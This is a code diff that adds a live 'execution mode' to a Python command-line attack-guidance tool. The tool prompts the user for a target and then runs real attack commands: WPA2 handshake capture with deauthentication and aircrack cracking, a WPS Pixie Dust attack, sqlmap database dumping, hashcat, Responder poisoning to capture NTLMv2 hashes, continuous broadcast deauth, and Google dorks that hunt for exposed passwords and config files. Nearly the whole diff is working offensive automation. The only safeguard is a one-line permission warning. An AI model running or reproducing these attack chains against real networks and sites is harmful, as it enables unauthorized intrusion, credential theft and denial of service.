@@ -3081,6 +3081,462 @@ def list_all():
                   f"{DIM}({aliases_preview}){RESET}")
         print()
 
+# ─────────────────────────────────────────────────────────────────────────────
+# EXECUTION ENGINE
+# ─────────────────────────────────────────────────────────────────────────────
+
+import shutil
+import subprocess
+import os
+import platform
+
+# Maps technique names → automated execution config
+EXECUTION_MAP = {
+
+    "WPA2 Password Cracking": {
+        "os": ["linux"],
+        "root": True,
+        "requires": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
+        "params": [
+            {"name": "iface",    "prompt": "Wireless interface",          "default": "wlan0"},
+            {"name": "bssid",    "prompt": "Target BSSID (MAC)",          "default": ""},
+            {"name": "channel",  "prompt": "Target channel",              "default": "6"},
+            {"name": "outfile",  "prompt": "Capture file prefix",         "default": "/tmp/capture"},
+            {"name": "wordlist", "prompt": "Wordlist path",               "default": "/usr/share/wordlists/rockyou.txt"},
+        ],
+        "steps": [
+            {"desc": "Kill interfering processes",
+             "cmd":  "airmon-ng check kill"},
+            {"desc": "Enable monitor mode on {iface}",
+             "cmd":  "airmon-ng start {iface}"},
+            {"desc": "Scan for nearby networks — press Ctrl+C when you see the target",
+             "cmd":  "airodump-ng {iface}mon",
+             "interactive": True},
+            {"desc": "Capture handshake from target network",
+             "cmd":  "airodump-ng -c {channel} --bssid {bssid} -w {outfile} {iface}mon",
+             "interactive": True},
+            {"desc": "Deauth clients to force handshake capture",
+             "cmd":  "aireplay-ng -0 10 -a {bssid} {iface}mon"},
+            {"desc": "Crack WPA2 password from captured handshake",
+             "cmd":  "aircrack-ng {outfile}*.cap -w {wordlist}"},
+            {"desc": "Restore interface to managed mode",
+             "cmd":  "airmon-ng stop {iface}mon"},
+        ],
+    },
+
+    "WPS Pixie Dust Attack": {
+        "os": ["linux"],
+        "root": True,
+        "requires": ["airmon-ng", "reaver"],
+        "params": [
+            {"name": "iface",   "prompt": "Wireless interface",  "default": "wlan0"},
+            {"name": "bssid",   "prompt": "Target BSSID (MAC)",  "default": ""},
+        ],
+        "steps": [
+            {"desc": "Kill interfering processes",
+             "cmd":  "airmon-ng check kill"},
+            {"desc": "Enable monitor mode",
+             "cmd":  "airmon-ng start {iface}"},
+            {"desc": "Scan for WPS-enabled networks — Ctrl+C when ready",
+             "cmd":  "wash -i {iface}mon",
+             "interactive": True},
+            {"desc": "Run Pixie Dust attack against target",
+             "cmd":  "reaver -i {iface}mon -b {bssid} -K 1 -vvv"},
+            {"desc": "Restore interface",
+             "cmd":  "airmon-ng stop {iface}mon"},
+        ],
+    },
+
+    "Port Scanning & Enumeration": {
+        "os": ["linux", "windows", "darwin"],
+        "root": False,
+        "requires": ["nmap"],
+        "params": [
+            {"name": "target",  "prompt": "Target IP / hostname / range (e.g. 192.168.1.1 or 192.168.1.0/24)", "default": ""},
+            {"name": "mode",    "prompt": "Scan type [quick/full/stealth/aggressive/vuln]",                     "default": "quick"},
+        ],
+        "steps": [
+            {"desc": "Ping sweep — discover live hosts",
+             "cmd":  "nmap -sn {target}"},
+            {"desc": "Run selected scan mode",
+             "cmd":  "{nmap_cmd} {target}",
+             "dynamic": "nmap_mode"},
+        ],
+        "dynamic_resolvers": {
+            "nmap_mode": {
+                "param": "mode",
+                "map": {
+                    "quick":      "nmap -F -T4",
+                    "full":       "nmap -p- -T4",
+                    "stealth":    "nmap -sS -T4",
+                    "aggressive": "nmap -A -T4",
+                    "vuln":       "nmap --script=vuln -T4",
+                }
+            }
+        },
+    },
+
+    "SQL Injection": {
+        "os": ["linux", "windows", "darwin"],
+        "root": False,
+        "requires": ["sqlmap"],
+        "params": [
+            {"name": "url",    "prompt": "Target URL (e.g. http://target.com/page?id=1)", "default": ""},
+            {"name": "level",  "prompt": "Test level [1-5]",                              "default": "3"},
+            {"name": "risk",   "prompt": "Risk level [1-3]",                              "default": "2"},
+            {"name": "output", "prompt": "Output directory",                              "default": "/tmp/sqlmap_out"},
+        ],
+        "steps": [
+            {"desc": "Detect SQL injection vulnerabilities",
+             "cmd":  "sqlmap -u \"{url}\" --level={level} --risk={risk} --batch --output-dir={output}"},
+            {"desc": "Extract databases",
+             "cmd":  "sqlmap -u \"{url}\" --dbs --batch --output-dir={output}"},
+            {"desc": "Dump all tables from detected databases",
+             "cmd":  "sqlmap -u \"{url}\" --dump-all --batch --output-dir={output}"},
+        ],
+    },
+
+    "Hash Cracking": {
+        "os": ["linux", "windows", "darwin"],
+        "root": False,
+        "requires": ["hashcat"],
+        "params": [
+            {"name": "hashfile", "prompt": "Path to file containing hashes",     "default": "hashes.txt"},
+            {"name": "hashtype", "prompt": "Hash type ID (e.g. 0=MD5, 1000=NTLM, 1800=sha512crypt, 13100=Kerberos)", "default": "0"},
+            {"name": "wordlist", "prompt": "Wordlist path",                      "default": "/usr/share/wordlists/rockyou.txt"},
+            {"name": "rules",    "prompt": "Rules file (leave blank to skip)",   "default": ""},
+        ],
+        "steps": [
+            {"desc": "Dictionary attack",
+             "cmd":  "hashcat -m {hashtype} {hashfile} {wordlist} --force"},
+            {"desc": "Rule-based attack (skipped if no rules provided)",
+             "cmd":  "hashcat -m {hashtype} {hashfile} {wordlist} -r {rules} --force",
+             "skip_if_empty": "rules"},
+            {"desc": "Show cracked passwords",
+             "cmd":  "hashcat -m {hashtype} {hashfile} --show"},
+        ],
+    },
+
+    "Packet Sniffing": {
+        "os": ["linux", "darwin"],
+        "root": True,
+        "requires": ["tcpdump"],
+        "params": [
+            {"name": "iface",   "prompt": "Network interface (e.g. eth0)",     "default": "eth0"},
+            {"name": "outfile", "prompt": "Save capture to file",              "default": "/tmp/capture.pcap"},
+            {"name": "filter",  "prompt": "BPF filter (leave blank for all)",  "default": ""},
+            {"name": "count",   "prompt": "Packet count (0 = unlimited)",      "default": "0"},
+        ],
+        "steps": [
+            {"desc": "Start packet capture",
+             "cmd":  "tcpdump -i {iface} -w {outfile} -c {count} {filter}",
+             "interactive": True},
+            {"desc": "Display captured packets (human-readable)",
+             "cmd":  "tcpdump -r {outfile} -A -nn"},
+        ],
+    },
+
+    "LLMNR/NBT-NS Poisoning": {
+        "os": ["linux"],
+        "root": True,
+        "requires": ["python3"],
+        "params": [
+            {"name": "iface",   "prompt": "Network interface",  "default": "eth0"},
+            {"name": "responder_path", "prompt": "Path to Responder.py", "default": "/opt/Responder/Responder.py"},
+        ],
+        "steps": [
+            {"desc": "Start Responder to poison LLMNR/NBT-NS and capture NTLMv2 hashes",
+             "cmd":  "python3 {responder_path} -I {iface} -rdw",
+             "interactive": True},
+            {"desc": "View captured hashes",
+             "cmd":  "cat /opt/Responder/logs/SMB-NTLMv2*.txt 2>/dev/null || ls /opt/Responder/logs/"},
+        ],
+    },
+
+    "Domain & Subdomain Enumeration": {
+        "os": ["linux", "darwin"],
+        "root": False,
+        "requires": ["subfinder"],
+        "params": [
+            {"name": "domain",  "prompt": "Target domain (e.g. target.com)",    "default": ""},
+            {"name": "outfile", "prompt": "Output file",                         "default": "/tmp/subdomains.txt"},
+            {"name": "wordlist","prompt": "DNS wordlist (leave blank for passive only)", "default": ""},
+        ],
+        "steps": [
+            {"desc": "Passive subdomain enumeration with Subfinder",
+             "cmd":  "subfinder -d {domain} -o {outfile} -silent"},
+            {"desc": "Certificate transparency lookup (crt.sh)",
+             "cmd":  "curl -s 'https://crt.sh/?q=%.{domain}&output=json' | python3 -c \"import sys,json; [print(e['name_value']) for e in json.load(sys.stdin)]\" | sort -u"},
+            {"desc": "DNS resolution of discovered subdomains",
+             "cmd":  "cat {outfile} | python3 -c \"import sys,socket; [print(h.strip(),'->',socket.gethostbyname(h.strip())) for h in sys.stdin if h.strip()]\" 2>/dev/null"},
+            {"desc": "Active brute-force (skipped if no wordlist provided)",
+             "cmd":  "subfinder -d {domain} -w {wordlist} -o {outfile}_brute -silent",
+             "skip_if_empty": "wordlist"},
+        ],
+    },
+
+    "Google Dorking": {
+        "os": ["linux", "windows", "darwin"],
+        "root": False,
+        "requires": [],
+        "params": [
+            {"name": "domain", "prompt": "Target domain (e.g. target.com)",   "default": ""},
+            {"name": "dork",   "prompt": "Dork type [files/logins/configs/dirs/all]", "default": "all"},
+        ],
+        "steps": [
+            {"desc": "Generate dork queries for target",
+             "cmd":  "echo 'DORK_SEARCH'",
+             "special": "google_dorks"},
+        ],
+    },
+
+    "Shodan Reconnaissance": {
+        "os": ["linux", "windows", "darwin"],
+        "root": False,
+        "requires": ["shodan"],
+        "params": [
+            {"name": "query", "prompt": "Shodan search query (e.g. org:'Target Corp' or hostname:target.com)", "default": ""},
+        ],
+        "steps": [
+            {"desc": "Search Shodan for target",
+             "cmd":  "shodan search --fields ip_str,port,org,product,version \"{query}\""},
+            {"desc": "Get detailed info on discovered IPs",
+             "cmd":  "shodan search --fields ip_str \"{query}\" | head -5 | xargs -I{{}} shodan host {{}}"},
+        ],
+    },
+
+    "Vulnerability Scan (Nmap)": {
+        "os": ["linux", "windows", "darwin"],
+        "root": False,
+        "requires": ["nmap"],
+        "params": [
+            {"name": "target", "prompt": "Target IP or hostname", "default": ""},
+            {"name": "outfile","prompt": "Save output to file",   "default": "/tmp/vuln_scan.txt"},
+        ],
+        "steps": [
+            {"desc": "Run Nmap vulnerability scripts",
+             "cmd":  "nmap -sV --script=vuln -T4 {target} -oN {outfile}"},
+            {"desc": "Run default + safe scripts",
+             "cmd":  "nmap -sC -sV -T4 {target}"},
+            {"desc": "Check common CVEs",
+             "cmd":  "nmap -sV --script=vulners -T4 {target}"},
+        ],
+    },
+
+    "Email OSINT & Harvesting": {
+        "os": ["linux", "darwin"],
+        "root": False,
+        "requires": ["theHarvester"],
+        "params": [
+            {"name": "domain",  "prompt": "Target domain",     "default": ""},
+            {"name": "sources", "prompt": "Sources [google/linkedin/bing/all]", "default": "google,linkedin,bing"},
+            {"name": "outfile", "prompt": "Output file",        "default": "/tmp/harvester_out.xml"},
+        ],
+        "steps": [
+            {"desc": "Harvest emails and subdomains with theHarvester",
+             "cmd":  "theHarvester -d {domain} -b {sources} -f {outfile}"},
+            {"desc": "Check for breached credentials (HaveIBeenPwned — manual)",
+             "cmd":  "echo 'Visit: https://haveibeenpwned.com/DomainSearch for {domain}'"},
+        ],
+    },
+
+    "Deauthentication Attack": {
+        "os": ["linux"],
+        "root": True,
+        "requires": ["airmon-ng", "aireplay-ng"],
+        "params": [
+            {"name": "iface",  "prompt": "Wireless interface",          "default": "wlan0"},
+            {"name": "bssid",  "prompt": "Target AP BSSID",             "default": ""},
+            {"name": "client", "prompt": "Target client MAC (blank = broadcast all)", "default": "FF:FF:FF:FF:FF:FF"},
+            {"name": "count",  "prompt": "Number of deauth packets (0 = continuous)", "default": "0"},
+        ],
+        "steps": [
+            {"desc": "Enable monitor mode",
+             "cmd":  "airmon-ng start {iface}"},
+            {"desc": "Scan to confirm target",
+             "cmd":  "airodump-ng --bssid {bssid} {iface}mon",
+             "interactive": True},
+            {"desc": "Send deauthentication frames",
+             "cmd":  "aireplay-ng -{count} -a {bssid} -c {client} {iface}mon",
+             "interactive": True},
+            {"desc": "Restore interface",
+             "cmd":  "airmon-ng stop {iface}mon"},
+        ],
+    },
+}
+
+# ── Execution Engine Functions ────────────────────────────────────────────────
+
+def check_tool(tool):
+    return shutil.which(tool) is not None
+
+def check_root():
+    return os.geteuid() == 0 if hasattr(os, 'geteuid') else False
+
+def prompt_param(p):
+    default = p.get("default", "")
+    if default:
+        val = input(f"  {CYAN}  {p['prompt']} [{default}]: {RESET}").strip()
+        return val if val else default
+    else:
+        while True:
+            val = input(f"  {CYAN}  {p['prompt']}: {RESET}").strip()
+            if val:
+                return val
+            print(f"  {YELLOW}  [!] This field is required.{RESET}")
+
+def run_cmd_live(cmd):
+    """Run command with live output."""
+    print(f"\n  {DIM}  $ {cmd}{RESET}\n")
+    try:
+        proc = subprocess.Popen(
+            cmd, shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+        for line in proc.stdout:
+            print(f"  {line}", end="")
+        proc.wait()
+        return proc.returncode
+    except KeyboardInterrupt:
+        print(f"\n  {YELLOW}[!] Step interrupted by user.{RESET}")
+        return -1
+
+def run_execution(technique_name, exec_conf):
+    """Run the execution engine for a technique."""
+    current_os = platform.system().lower()
+    allowed_os = exec_conf.get("os", ["linux", "windows", "darwin"])
+
+    if current_os not in allowed_os:
+        print(f"\n  {YELLOW}[!] This technique requires: {', '.join(allowed_os)}{RESET}")
+        print(f"  {YELLOW}    Current OS: {current_os}{RESET}")
+        return
+
+    # Check root
+    if exec_conf.get("root") and not check_root():
+        print(f"\n  {RED}[!] This technique requires root/administrator privileges.{RESET}")
+        print(f"  {YELLOW}    Run with: sudo python3 Project101.py \"{technique_name}\" --run{RESET}")
+        return
+
+    # Check required tools
+    missing = [t for t in exec_conf.get("requires", []) if not check_tool(t)]
+    if missing:
+        print(f"\n  {RED}[!] Missing required tools: {', '.join(missing)}{RESET}")
+        print(f"  {YELLOW}    Install them and re-run.{RESET}")
+        return
+
+    print(f"\n  {YELLOW}{BOLD}  ⚡ EXECUTION MODE — {technique_name}{RESET}")
+    print(f"  {DIM}  {'─'*60}{RESET}")
+    print(f"  {RED}  ⚠  Only run against systems you own or have permission to test.{RESET}")
+
+    confirm = input(f"\n  {YELLOW}  Proceed? [y/N]: {RESET}").strip().lower()
+    if confirm != 'y':
+        print(f"  {DIM}  Aborted.{RESET}")
+        return
+
+    # Collect parameters
+    print(f"\n  {CYAN}{BOLD}  [*] Set Parameters:{RESET}")
+    params = {}
+    for p in exec_conf.get("params", []):
+        params[p["name"]] = prompt_param(p)
+
+    # Resolve dynamic commands
+    dynamic_resolvers = exec_conf.get("dynamic_resolvers", {})
+    for key, resolver in dynamic_resolvers.items():
+        param_val = params.get(resolver["param"], "")
+        resolved  = resolver["map"].get(param_val, list(resolver["map"].values())[0])
+        params[key] = resolved
+
+    # Execute steps
+    print(f"\n  {GREEN}{BOLD}  [*] Starting Execution...{RESET}\n")
+    steps = exec_conf.get("steps", [])
+    for i, step in enumerate(steps, 1):
+
+        # Skip step if param is empty
+        skip_key = step.get("skip_if_empty")
+        if skip_key and not params.get(skip_key, "").strip():
+            print(f"  {DIM}  [{i:02d}] Skipping: {step['desc']} (no {skip_key} provided){RESET}\n")
+            continue
+
+        # Special handler: google dorks
+        if step.get("special") == "google_dorks":
+            print_google_dorks(params)
+            continue
+
+        # Build command from template
+        try:
+            cmd = step["cmd"].format(**params)
+        except KeyError as e:
+            print(f"  {YELLOW}  [!] Missing param {e} — skipping step {i}{RESET}")
+            continue
+
+        desc = step["desc"].format(**params)
+        print(f"  {CYAN}{BOLD}  [{i:02d}] {desc}{RESET}")
+
+        ask = input(f"  {DIM}      Run this step? [Y/n/q]: {RESET}").strip().lower()
+        if ask == 'q':
+            print(f"  {YELLOW}  [!] Execution stopped.{RESET}")
+            break
+        if ask == 'n':
+            print(f"  {DIM}      Skipped.{RESET}\n")
+            continue
+
+        if step.get("interactive"):
+            print(f"  {DIM}      Running interactively — press Ctrl+C to move to next step.{RESET}")
+
+        run_cmd_live(cmd)
+        print()
+
+    print(f"  {GREEN}{BOLD}  [✓] Execution complete.{RESET}\n")
+
+def print_google_dorks(params):
+    """Print generated Google dork queries."""
+    domain = params.get("domain", "target.com")
+    dork   = params.get("dork", "all")
+    dorks  = {
+        "files":   [
+            f'site:{domain} filetype:pdf "confidential"',
+            f'site:{domain} filetype:env OR filetype:log OR filetype:sql',
+            f'site:{domain} filetype:bak OR filetype:backup OR filetype:old',
+            f'site:{domain} filetype:xml OR filetype:json "password"',
+        ],
+        "logins":  [
+            f'site:{domain} inurl:admin OR inurl:login OR inurl:portal',
+            f'site:{domain} intitle:"Login" OR intitle:"Admin"',
+            f'site:{domain} inurl:wp-admin OR inurl:wp-login',
+        ],
+        "configs": [
+            f'site:{domain} inurl:config OR inurl:settings OR inurl:.env',
+            f'site:{domain} "DB_PASSWORD" OR "API_KEY" OR "SECRET_KEY"',
+            f'site:{domain} inurl:phpinfo.php OR inurl:info.php',
+        ],
+        "dirs":    [
+            f'site:{domain} intitle:"Index of /"',
+            f'site:{domain} intitle:"Index of /.git"',
+            f'site:{domain} intitle:"Directory listing"',
+        ],
+    }
+    selected = list(dorks.values()) if dork == "all" else [dorks.get(dork, [])]
+    print(f"\n  {GREEN}{BOLD}  Generated Dork Queries for: {domain}{RESET}\n")
+    for group in selected:
+        for d in group:
+            encoded = d.replace(" ", "+")
+            print(f"  {CYAN}  Query : {d}{RESET}")
+            print(f"  {DIM}  Link  : https://www.google.com/search?q={encoded}{RESET}\n")
+
+def show_manual_commands(t, exec_conf=None):
+    """Show pre-filled manual commands when no executor is available."""
+    print(f"\n  {YELLOW}{BOLD}  ⚡ EXECUTION — Manual Commands{RESET}")
+    print(f"  {DIM}  No automated executor for this technique.{RESET}")
+    print(f"  {DIM}  Here are the tools and commands to use:\n{RESET}")
+    for tool in t.get("tools", []):
+        print(f"  {GREEN}  • {tool}{RESET}")
+    print(f"\n  {CYAN}  Attack Steps (copy & adapt):{RESET}")
+    for i, step in enumerate(t.get("attack_steps", []), 1):
+        print(f"  {DIM}  [{i:02d}] {step}{RESET}")
+
+
 def main():
     print_banner()
 
@@ -3093,19 +3549,22 @@ def main():
     parser.add_argument("--list",    action="store_true", help="List all available techniques")
     parser.add_argument("--attack",  action="store_true", help="Show attack steps only")
     parser.add_argument("--defense", action="store_true", help="Show defense steps only")
-    parser.add_argument("--category", help="Filter list by category (Web, Network, System, Wireless, etc.)")
+    parser.add_argument("--category",help="Filter list by category")
+    parser.add_argument("--run",     action="store_true", help="Execute the attack (requires relevant tools installed)")
 
     if len(sys.argv) == 1:
         print(f"{CYAN}  Describe an attack technique in plain language.{RESET}")
-        print(f"{CYAN}  Get step-by-step attack & defense guidance instantly.\n{RESET}")
+        print(f"{CYAN}  Get step-by-step attack & defense guidance, or execute it live.\n{RESET}")
         print(f"{YELLOW}  Usage:{RESET}")
-        print(f"    python3 Project101.py \"<technique or description>\"")
+        print(f"    python3 Project101.py \"<technique or description>\" [--run]")
         print(f"    python3 Project101.py --list\n")
         print(f"{YELLOW}  Examples:{RESET}")
         print(f"    python3 Project101.py \"sql injection\"")
         print(f"    python3 Project101.py \"break wifi\"")
-        print(f"    python3 Project101.py \"how to intercept traffic\"")
-        print(f"    python3 Project101.py \"privilege escalation linux\"")
+        print(f"    python3 Project101.py \"crack wifi\" --run")
+        print(f"    python3 Project101.py \"port scan\" --run")
+        print(f"    python3 Project101.py \"hash cracking\" --run")
+        print(f"    python3 Project101.py \"subdomain enum\" --run")
         print(f"    python3 Project101.py \"phishing\" --attack")
         print(f"    python3 Project101.py \"xss\" --defense")
         print(f"    python3 Project101.py --list --category Web")
@@ -3124,7 +3583,8 @@ def main():
                 print(f"\n  {CYAN}{BOLD}[ {args.category} ]{RESET}\n")
                 for t in filtered:
                     risk_color = RISK_COLORS.get(t["risk"], "")
-                    print(f"  {BOLD}{t['name']:<35}{RESET} {risk_color}[{t['risk']}]{RESET}")
+                    has_exec   = "⚡" if t["name"] in EXECUTION_MAP else "  "
+                    print(f"  {has_exec} {BOLD}{t['name']:<35}{RESET} {risk_color}[{t['risk']}]{RESET}")
         else:
             list_all()
         sys.exit(0)
@@ -3148,7 +3608,6 @@ def main():
     if args.defense and not args.attack:
         show_attack = False
 
-    # Show best match, mention others if any
     best = matches[0]
     display_technique(best, show_attack=show_attack, show_defense=show_defense)
 
@@ -3156,6 +3615,19 @@ def main():
         others = [m["name"] for m in matches[1:4]]
         print(f"  {DIM}Related techniques: {', '.join(others)}{RESET}")
         print(f"  {DIM}Search for them directly for more detail.{RESET}\n")
+
+    # Execution mode
+    if args.run:
+        exec_conf = EXECUTION_MAP.get(best["name"])
+        if exec_conf:
+            run_execution(best["name"], exec_conf)
+        else:
+            show_manual_commands(best)
+    else:
+        if best["name"] in EXECUTION_MAP:
+            print(f"  {GREEN}  ⚡ This technique supports live execution.{RESET}")
+            print(f"  {DIM}     Add --run to execute it: python3 Project101.py \"{args.query}\" --run{RESET}\n")
+
 
 if __name__ == "__main__":
     main()
